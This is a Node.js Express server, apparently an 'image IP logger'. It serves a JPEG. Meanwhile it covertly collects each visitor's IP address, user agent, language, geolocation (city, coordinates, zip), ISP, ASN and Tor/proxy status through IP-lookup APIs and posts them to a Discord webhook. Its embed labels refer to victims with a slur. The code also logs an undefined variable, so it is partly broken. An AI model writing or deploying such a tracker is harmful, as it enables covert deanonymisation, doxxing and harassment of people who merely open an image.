const express = require('express');
const axios = require('axios');
const ip = require('ip');
const fs = require('fs');
const bodyParser = require("body-parser")
const app = express();
const PORT = 8080;
let config = {};


const image_path = '';
// Made by dev
//CmR2SUw=

const ip_api_key = ""
const ip_se_api_key = ""
const webhook = ""
const webhook_name="Devs image logger"
const ip_api_url_first = "https://api.ip2location.io/?key="
const end_ip_api_url = "&ip="
const ip_api_url_second = "https://api.ipdata.co/"
const end_ip_api_url_second = "?api-key="
function getGeoLocationFromIPAPI(ip) {
    return axios.get(ip_api_url_first + ip_se_api_key + end_ip_api_url + ip)
        .then(response => response.data)
        .catch(error => {
            console.error('Error fetching geolocation data from ip2location.io:', error.message);
            throw error;
        });
}

function getAsn(ip) {
    return axios.get(`https://ipinfo.io/${ip}/json`)
        .then(response => response.data)
        .catch(error => {
            console.error('Error fetching ASN data from ipinfo.io:', error.message);
            throw error;
        });
}
function data(ip) {
    return axios.get(ip_api_url_second + ip +  end_ip_api_url_second + ip_api_key)
        .then(response => response.data)
        .catch(error => {
            console.error("ERROR ")
        });
}
function parseUserAgent(userAgent) {
    const parts = userAgent.split(' ');

    let browser = 'Unknown';
    let browserVersion = 'Unknown';
    let os = 'Unknown';
    let osVersion = 'Unknown';

    for (const part of parts) {
        if (part.includes('Chrome/')) {
            browser = 'Chrome';
            browserVersion = part.split('/')[1];
        } else if (part.includes('Safari/')) {
            browser = 'Safari';
            browserVersion = part.split('/')[1];
        } else if (part.includes('Firefox/')) {
            browser = 'Firefox';
            browserVersion = part.split('/')[1];
        } else if (part.includes('Windows')) {
            os = 'Windows';
            osVersion = part.split('Windows ')[1];
        } else if (part.includes('Macintosh')) {
            os = 'Mac OS X';
            osVersion = part.split('Mac OS X ')[1];
        } else if (part.includes('iPhone')) {
            os = 'iOS';
            osVersion = part.split('iPhone OS ')[1];
        } else if (part.includes('Android')) {
            os = 'Android';
            osVersion = part.split('Android ')[1];
        }
    }

    return { browser, browserVersion, os, osVersion };
}


function serveImage(path, res) {
    fs.readFile(path, (err, data) => {
        if (err) {
            res.writeHead(404, { 'Content-Type': 'text/plain' });
            res.end('404 Not Found');
        } else {
            res.writeHead(200, { 'Content-Type': 'image/jpeg' });
            res.end(data);
        }
    });
}









app.get("/", (req, res) => {


    const ipAddr = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0] : req.ip;
    const other = req.headers['accept-language'];
    const q = req.headers['content-encoding'];
    var ipgrab_time = new Date().toISOString();



    console.log(dats)
    data(ipAddr)
        .then(Help => {
            getAsn(ipAddr)
                .then(asnData => {
                    return getGeoLocationFromIPAPI(ipAddr)
                        .then(geoData => {
                            const userAgent = parseUserAgent(req.headers['user-agent']);

                            const embed = {
                                color: 16330592,
                                author: {
                                    name: `DEVS IMAGE IP LOGGER BEAMED IP `,
                                    icon_url: 'https://cdn.discordapp.com/attachments/1211856660927094826/1228842076905537646/Screenshot_2024-04-13_at_3.59.36_PM.png?ex=662d835d&is=661b0e5d&hm=36af8b5f261b2e796b31fc1381820f0fcd4724a0ed9cdcd4d526df2a895419be&',
                                },
                                description: `\`\`\`${req.headers['user-agent']}\`\`\``,
                                fields: [
                                    {
                                        name: 'Retarded kids ip',
                                        value: `> \`\`\`${ipAddr}\`\`\``,
                                        inline: true,
                                    },
                                    {
                                        name: 'Retarded kids network',
                                        value: `> \`\`\`${Help.asn.route}\`\`\``,
                                        inline: true,
                                    },
                                    {
                                        name: 'Retarded kids ASN ',
                                        value: `> \`\`\`${Help.asn.asn}\`\`\``,
                                        inline: true,

                                    },
                                    {
                                        name: 'Domain',
                                        value: `> \`\`\`${Help.asn.domain}\`\`\``,
                                        inline: true,
                                    },
                                    {
                                        name: 'Ip Type',
                                        value: `> \`\`\`${Help.asn.type}\`\`\``,
                                        inline: true,
                                    },

                                    {
                                        name: 'Retarded kids Country',
                                        value: `> \`\`\`${geoData.country_name || '❓'}\`\`\``,
                                        inline: true,
                                    },
                                    {
                                        name: 'Retarded kids City',
                                        value: `> \`\`\`${Help.city || '❓'}\`\`\``,
                                        inline: true,
                                    },
                                    {
                                        name: 'Retarded kids Region',
                                        value: `> \`\`\`${geoData.region_name || '❓'}\`\`\``,
                                        inline: true,
                                    },
                                    {
                                        name: 'Retarded kids Latitude',
                                        value: `> \`\`\`${geoData.latitude || '❓'}\`\`\``,
                                        inline: true,
                                    },
                                    {
                                        name: 'Retarded kids Longitude',
                                        value: `> \`\`\`${geoData.longitude || '❓'}\`\`\``,
                                        inline: true,
                                    },
                                    {
                                        name: 'Retarded kids Timezone',
                                        value: `> \`\`\`${geoData.time_zone || '❓'}\`\`\``,
                                        inline: true,
                                    },
                                    {
                                        name: 'Retarded kids ISP',
                                        value: `> \`\`\`${geoData.as || '❓'}\`\`\``,
                                        inline: true,
                                    },
                                    {
                                        name: 'Retarded kids AS',
                                        value: `> \`\`\`${geoData.asn || '❓'}\`\`\``,
                                        inline: true,
                                    },
                                    {
                                        name: 'Retarded kids Zip',
                                        value: `> \`\`\`${geoData.zip_code || '❓'}\`\`\``
                                    },
                                    {
                                        name: 'Proxy',
                                        value: `> \`\`\`${geoData.is_proxy || 'No proxy detected'}\`\`\``,
                                        inline: true
                                    },
                                    {
                                        name: 'Retarded kids Language',
                                        value: `> \`\`\`${other}\`\`\``,
                                        inline: true
                                    },
                                    {
                                        name: 'Retarded kids Operating System',
                                        value: `> \`\`\`${userAgent.os}\`\`\``,
                                        inline: true
                                    },
                                    {
                                        name: 'Retarded kids Hostname',
                                        value: `> \`\`\`${asnData.hostname}\`\`\``,
                                        inline: true
                                    },
                                    {
                                        name: 'Tor?',
                                        value: `> \`\`\`${Help.threat.is_tor}\`\`\``,
                                        inline: true
                                    },
                                    {
                                        name: 'Ip is a known Attacker?',
                                        value: `> \`\`\`${Help.threat.is_known_attacker}\`\`\``,
                                        inline: true,
                                    },
                                    {
                                        name: 'is anonymous?',
                                        value: `> \`\`\`${Help.threat.is_anonymous}\`\`\``,
                                        inline: true
                                    },
                                    {
                                        name: 'Data Center?',
                                        value: `> \`\`\`${Help.threat.is_datacenter}\`\`\``,
                                        inline: true
                                    },
                                    {
                                        name: 'Blocked Websites',
                                        value: `> \`\`\`${Help.asn.blocklists}\`\`\``,
                                        inline: true,
                                    },
                                    {
                                        name: 'Icloud Relay?',
                                        value: `> \`\`\`${Help.threat.is_icloud_relay}\`\`\``,
                                        inline: true
                                    },
                                    {
                                        name: 'Date of the IP Grab',
                                        value: `> \`\`\`${ipgrab_time}\`\`\``,
                                        inline: true
                                    },
                                ],
                                footer: {
                                    text: 'Devs Image IP Grabber Services.',
                                    icon_url: 'https://cdn.discordapp.com/attachments/1202799854682902562/1231016166130978896/Screenshot_2024-04-19_155822.png?ex=662448a5&is=6622f725&hm=684a9a4a957259acd9b45b66d9d2695b9236e64eff5fbe12bf587d441e93e1f1&'
                                },
                            };

                            axios.post(webhook, {
                                embeds: [embed],
                                username: webhook_name,
                                content: ""

                            })
                                .then(() => {
                                    serveImage(image_path, res);


                                })
                                .catch(error => {
                                    console.error('Error sending webhook:', error.message);
                                    res.status(500).send('Internal Server Error');
                                });
                        });
                })
                .catch(err => {
                    console.error('Error:', err.message);
                    res.status(500).send('Internal Server Error');
                });
        })

})





app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
})
